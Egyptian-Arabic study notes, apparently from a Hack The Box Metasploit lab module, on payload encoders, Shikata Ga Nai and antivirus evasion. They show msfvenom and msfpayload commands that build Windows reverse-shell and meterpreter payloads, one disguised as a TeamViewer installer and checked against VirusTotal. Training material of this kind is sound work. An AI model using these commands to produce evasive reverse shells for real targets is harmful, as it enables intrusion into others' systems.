- الEncoders دي أدوات بتستخدم عشان تخلي الPayload يشتغل صح علي المعمارية الصح وتقلل فرصة إن الAnti-virus يمسكه
- الEncoder برضو بيشيل الbad characters
**طب يعني ايه معمارية المعالج دي؟**
المعالجات ليها أنواع ومعماريات مختلفه زي:
- x86
- x64
- ARM
- sparc
- ppc
- mips
- الPayload اللي مكتوب لمعمارية معينة مش هيشتغل علي معمارية تانيه
**هنا بيجي دور الـEncoder**
- بيعيد ترتيب او تشفير الpayload بحيث يعرف يتخطي الAV
**الAntivirus Evasion**
برامج الحمايه بتعتمد علي حاجتين وهما:
- Signatures
- Patterns
- فا الانكودر هنا بيغير شكل الكود من غير مايغير وظيفته فا الAV ميلاقيش التوقيع المعروف فيعدي الكود عادي
- في واحد من اشهر الEncoders اسمها Shikata Ga Nai وده عشان هي صعب الAV يكتشف الpayload اللي معمول بالmechanism ده بس دلوقتي احدث اجهزه الdetection بقت تمسكه
---
## Selecting an Encoder
- قبل 2015 فالميتاسبلويت عشان تعمل custom payload بنستخدم `msfpaylaod` و `msfconsole` ودول بيكونو موجودين في `/usr/share/framework2/`
- عشان نعمل الpayload نفسه هنستخدم الmsfpayload وعشان نعمله encoding هنستعمل الmsfconsole
```shell-session
0xTroj6n@htb[/htb]$ msfpayload windows/shell_reverse_tcp LHOST=127.0.0.1 LPORT=4444 R | msfencode -b '\x00' -f perl -e x86/shikata_ga_nai
...
<SNIP>
```
- استخدمنا ال`|` عشان نعمل redirect للoutput

|الجزء|معناه|بيعمل إيه؟|ليه مهم؟|
|---|---|---|---|
|`msfpayload`|أداة توليد Payload|بتطلع Shellcode خام|أساس تكوين الـ payload|
|`windows/shell_reverse_tcp`|نوع الـ Payload|Reverse Shell على Windows|الضحية هي اللي تتصل|
|`LHOST=127.0.0.1`|IP المستقبل|المكان اللي الاتصال هيرجعله|تحديد وجهة الاتصال|
|`LPORT=4444`|رقم البورت|البورت اللي الهجوم سامع عليه|لازم يبقى مفتوح|
|`R`|Raw output|يطلع Shellcode Binary|مطلوب للـ encoding|
|`|`|Pipe|ينقل الناتج للأمر التاني|
|`msfencode`|أداة Encoding|تشفير الـ payload|تغيير شكل الكود|
|`-b '\x00'`|Bad Character|يمنع NULL byte|عشان ميكسرش الـ exploit|
|`-f perl`|Output format|يطلع الكود بصيغة Perl|للاستخدام في سكربت|
|`-e x86/shikata_ga_nai`|Encoder|يشفر الـ payload|تغيير الشكل + إزالة bad chars|
#### Generating Payload - Without Encoding

```shell-session
0xTroj6n@htb[/htb]$ msfvenom -a x86 --platform windows -p windows/shell/reverse_tcp LHOST=127.0.0.1 LPORT=4444 -b "\x00" -f perl
...
```shell-session
0xTroj6n@htb[/htb]$ msfvenom -a x86 --platform windows -p windows/shell/reverse_tcp LHOST=127.0.0.1 LPORT=4444 -b "\x00" -f perl -e x86/shikata_ga_nai
...
<SNIP>
```
- عشان تشوف الEncoders بتوع الmetasploit هنكتب امر `show encoders` في ال`msfconsole
```shell-session
...
```
- لو نلاحظ كده كل الencoders بمعمارية الx64 وده لأن الmetasploit ذكيه بتشوف البايلود اللي اخترته وتديك الencoders بتوع المعماريات بتاعته يعني مثلا لو جربنا payload تاني زي `MS09-050 Microsoft SRV2.SYS SMB Negotiate ProcessID Function Table Dereference Exploit`
...
```
- بص هنا كلهم x86 عشان دي معمارية الpayload
- تعالي بقي نستخدم الmsfvenom
```shell-session
0xTroj6n@htb[/htb]$ msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp LHOST=10.10.14.5 LPORT=8080 -e x86/shikata_ga_nai -f exe -o ./TeamViewerInstall.exe
...
```shell-session
0xTroj6n@htb[/htb]$ msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp LHOST=10.10.14.5 LPORT=8080 -e x86/shikata_ga_nai -f exe -i 10 -o /root/Desktop/TeamViewerInstall.exe
...
```
- لو احنا عملنا check علي الفايل ده علي موقع virus total هيجبلك انه malware بنسبة 54% او 52% واحنا مش عاوزين نستخدم virus total كل شوية ونتشيك ف الmetasploit موفرلنا اداة اسمها msf-virustotal ودي بتستخدم api key بنجيبه من virus total وهي تعملك check فالاداة نفسها من غير ماتفتح الموقع
#### MSF - VirusTotal

```shell-session
0xTroj6n@htb[/htb]$ msf-virustotal -k <API key> -f TeamViewerInstall.exe
